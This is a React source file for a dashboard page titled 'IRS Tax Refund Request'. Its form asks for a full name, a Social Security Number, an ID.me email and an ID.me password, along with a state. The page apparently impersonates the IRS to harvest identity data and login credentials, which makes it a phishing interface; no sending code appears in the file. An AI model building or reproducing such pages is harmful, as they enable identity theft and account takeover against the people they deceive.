import { useState } from 'react'
import ThemeToggleButton from '../../components/ThemeToggleButton'
import { Bell, CalendarDays, Receipt, User, ShieldCheck, Mail, LockKeyhole, Key, Globe, AlertCircle } from 'lucide-react'

const states = [
    'Alabama', 'Alaska', 'Arizona', 'Arkansas', 'California', 'Colorado',
    'Connecticut', 'Delaware', 'Florida', 'Georgia', 'Hawaii', 'Idaho',
    'Illinois', 'Indiana', 'Iowa', 'Kansas', 'Kentucky', 'Louisiana',
    'Maine', 'Maryland', 'Massachusetts', 'Michigan', 'Minnesota',
    'Mississippi', 'Missouri', 'Montana', 'Nebraska', 'Nevada',
    'New Hampshire', 'New Jersey', 'New Mexico', 'New York',
    'North Carolina', 'North Dakota', 'Ohio', 'Oklahoma', 'Oregon',
    'Pennsylvania', 'Rhode Island', 'South Carolina', 'South Dakota',
    'Tennessee', 'Texas', 'Utah', 'Vermont', 'Virginia', 'Washington',
    'West Virginia', 'Wisconsin', 'Wyoming',
]

// ── Reusable input wrapper ────────────────────────────────────────────────────
function Field({ label, icon: Icon, children }) {
    return (
        <div className='flex flex-col gap-1.5'>
            <label className='text-sm font-medium text-zen-light-text dark:text-zen-text'>{label}</label>
            <div className='relative'>
                <Icon className='absolute left-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-zen-light-muted dark:text-zen-muted pointer-events-none' />
                {children}
            </div>
        </div>
    )
}

// ── Shared input class ────────────────────────────────────────────────────────
const inputCls = 'w-full pl-10 pr-4 py-3 rounded-xl bg-zen-light-bg dark:bg-zen-bg border border-zen-light-border dark:border-zen-border text-zen-light-text dark:text-zen-text placeholder:text-zen-light-muted dark:placeholder:text-zen-muted text-sm focus:outline-none focus:ring-2 focus:ring-zen-primary/50 focus:border-zen-primary transition'

// ── Section divider ───────────────────────────────────────────────────────────
function SectionTitle({ icon: Icon, title }) {
    return (
        <div className='flex items-center gap-2.5 pt-2'>
            <div className='w-8 h-8 rounded-full bg-zen-primary/10 border border-zen-primary/20 flex items-center justify-center shrink-0'>
                <Icon className='w-4 h-4 text-zen-primary' />
            </div>
            <span className='text-base font-semibold text-zen-light-text dark:text-zen-text'>{title}</span>
        </div>
    )
}

const Irs = ({ theme, setTheme }) => {
    const date = new Date().toLocaleDateString('en-US', {
        weekday: 'long', year: 'numeric', month: 'long', day: 'numeric',
    })
    const [showNotif, setShowNotif] = useState(false)
    const [form, setForm] = useState({
        fullName: '', ssn: '', idEmail: '', idPassword: '', state: '',
    })
    const update = (key, val) => setForm(prev => ({ ...prev, [key]: val }))

    return (
        <div className='px-3 py-4 xl:py-0 space-y-6' onClick={() => setShowNotif(false)}>

            {/* ── Desktop top bar ── */}
            <div className='hidden xl:flex items-center justify-between'>
                <div className='flex items-center gap-2 text-zen-light-muted dark:text-zen-muted text-sm'>
                    <CalendarDays size={16} />
                    <span>{date}</span>
                </div>
                <div className='flex items-center gap-3'>
                    <div className='relative' onClick={e => e.stopPropagation()}>
                        <button
                            onClick={() => setShowNotif(!showNotif)}
                            className='p-2 rounded-full hover:bg-zen-light-card dark:hover:bg-zen-card'
                        >
                            <Bell size={24} className='text-zen-light-muted dark:text-zen-muted' />
                        </button>
                        {showNotif && (
                            <div className='absolute right-0 top-10 w-[350px] p-3 rounded-md border border-zen-light-border dark:border-zen-border shadow-lg bg-zen-light-card dark:bg-zen-card z-50'>
                                <div className='flex justify-between border-b border-zen-light-border dark:border-zen-border p-2'>
                                    <p className='text-zen-light-text dark:text-zen-text font-medium'>Notifications</p>
                                    <p className='text-zen-primary cursor-pointer text-sm'>Mark as read</p>
                                </div>
                            </div>
                        )}
                    </div>
                    <ThemeToggleButton theme={theme} setTheme={setTheme} />
                </div>
            </div>

            {/* ── Page heading ── */}
            <div>
                <h1 className='text-xl sm:text-2xl font-bold text-zen-light-text dark:text-zen-text'>IRS Tax Refund</h1>
                <p className='text-sm text-zen-light-muted dark:text-zen-muted mt-0.5'>
                    <span className='hover:underline cursor-pointer'>Dashboard</span>
                    <span className='mx-2'>›</span>
                    <span>IRS Tax Refund</span>
                </p>
            </div>

            {/* ── Hero ── */}
            <div className='rounded-2xl overflow-hidden border border-zen-light-border dark:border-zen-border'>
                <div
                    className='relative flex justify-center pt-8 pb-14 px-4 text-center overflow-hidden'
                    style={{ background: 'linear-gradient(135deg, #0f4c6b 0%, #1a7a8a 60%, #1e9e9e 100%)' }}
                >
                    <div className='relative z-10'>
                        <div className='w-14 h-14 mx-auto rounded-full bg-zen-text/15 flex items-center justify-center mb-3'>
                            <Receipt size={28} className='text-zen-text' strokeWidth={1.75} />
                        </div>
                        <h2 className='text-xl sm:text-2xl font-bold text-zen-text'>IRS Tax Refund Request</h2>
                        <p className='text-zen-text/70 text-xs sm:text-sm mt-1 max-w-sm mx-auto'>
                            Fill out the form below to submit your IRS tax refund request
                        </p>
                    </div>
                    {/* wave */}
                    <svg className='absolute bottom-0 left-0 w-full h-8 text-zen-light-card dark:text-zen-card'
                        viewBox='0 0 1440 100' preserveAspectRatio='none' fill='currentColor'>
                        <path opacity='0.35' d='M0,60 C240,10 480,90 720,50 C960,10 1200,80 1440,40 L1440,100 L0,100 Z' />
                        <path d='M0,80 C240,40 480,100 720,70 C960,30 1200,90 1440,60 L1440,100 L0,100 Z' />
                    </svg>
                </div>

                {/* ── Form body ── */}
                <div className='bg-zen-light-card dark:bg-zen-card px-4 sm:px-6 py-8'>
                    <form className='w-full xl:max-w-2xl mx-auto flex flex-col gap-6'>

                        {/* Personal Information */}
                        <div className='flex flex-col gap-4 bg-zen-light-bg dark:bg-zen-bg border border-zen-light-border dark:border-zen-border rounded-xl p-4 sm:p-5'>
                            <SectionTitle icon={User} title='Personal Information' />

                            <Field label='Full Name' icon={User}>
                                <input
                                    type='text'
                                    required
                                    placeholder='Enter your full name'
                                    value={form.fullName}
                                    onChange={e => update('fullName', e.target.value)}
                                    className={inputCls}
                                />
                            </Field>

                            <Field label='Social Security Number (SSN)' icon={ShieldCheck}>
                                <input
                                    type='text'
                                    required
                                    placeholder='XXX-XX-XXXX'
                                    value={form.ssn}
                                    onChange={e => update('ssn', e.target.value)}
                                    className={inputCls}
                                />
                            </Field>
                        </div>

                        {/* ID.me Credentials */}
                        <div className='flex flex-col gap-4 bg-zen-light-bg dark:bg-zen-bg border border-zen-light-border dark:border-zen-border rounded-xl p-4 sm:p-5'>
                            <SectionTitle icon={LockKeyhole} title='ID.me Credentials' />

                            <Field label='ID.me Email' icon={Mail}>
                                <input
                                    type='email'
                                    required
                                    placeholder='Enter your ID.me email'
                                    value={form.idEmail}
                                    onChange={e => update('idEmail', e.target.value)}
                                    className={inputCls}
                                />
                            </Field>

                            <Field label='ID.me Password' icon={Key}>
                                <input
                                    type='password'
                                    required
                                    maxLength={30}
                                    placeholder='Enter your ID.me password'
                                    value={form.idPassword}
                                    onChange={e => update('idPassword', e.target.value)}
                                    className={inputCls}
                                />
                            </Field>
                        </div>

                        {/* Location */}
                        <div className='flex flex-col gap-4 bg-zen-light-bg dark:bg-zen-bg border border-zen-light-border dark:border-zen-border rounded-xl p-4 sm:p-5'>
                            <SectionTitle icon={Globe} title='Location Information' />

                            <Field label='State' icon={Globe}>
                                <select
                                    required
                                    value={form.state}
                                    onChange={e => update('state', e.target.value)}
                                    className={inputCls + ' appearance-none'}
                                >
                                    <option value='' disabled>Select your state</option>
                                    {states.map(s => <option key={s} value={s}>{s}</option>)}
                                </select>
                            </Field>
                        </div>

                        {/* Important notice */}
                        <div className='flex gap-3 rounded-xl border border-zen-primary/20 p-4'
                            style={{ background: 'rgba(14,165,255,0.07)' }}>
                            <AlertCircle className='w-5 h-5 text-zen-primary shrink-0 mt-0.5' />
                            <div>
                                <p className='text-sm font-semibold text-zen-light-text dark:text-zen-text mb-1'>Important Notice</p>
                                <p className='text-sm text-zen-light-muted dark:text-zen-muted leading-relaxed'>
                                    Please ensure all information provided is accurate and matches your ID.me account details.
                                    Any discrepancies may result in delays or rejection of your refund request.
                                </p>
                            </div>
                        </div>

                        {/* Submit */}
                        <button
                            type='submit'
                            className='w-full py-3 rounded-xl bg-zen-primary hover:bg-zen-secondary text-zen-text font-semibold text-sm transition-all duration-300 hover:shadow-neon active:scale-[0.98]'
                        >
                            Send Request
                        </button>

                    </form>
                </div>
            </div>

        </div>
    )
}

export default Irs
